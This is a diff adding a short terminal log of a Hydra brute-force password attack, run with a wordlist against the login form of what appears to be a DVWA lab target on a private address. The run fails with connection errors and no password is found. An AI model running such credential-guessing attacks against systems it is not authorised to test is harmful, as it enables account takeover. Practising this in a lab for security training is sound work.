@@ -1,0 +1,13 @@
+INICIO=2026-11-25 17:05:50
+kali:~$ hydra -l admin -P /usr/share/wordlists/fasttrack.txt -t 4 192.168.56.10 http-get-form \
+  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=***; security=low:F=incorrect"
+
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 262 login tries (l:1/p:262), ~66 tries per task
+[DATA] attacking http-get-form://192.168.56.10:80/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=***; security=low:F=Username and/or password incorrect.
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+[INFO] Writing restore file because 2 server scans could not be completed
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+[ERROR] 1 target was disabled because of too many errors
+[ERROR] 1 targets did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-11-25 17:06:08
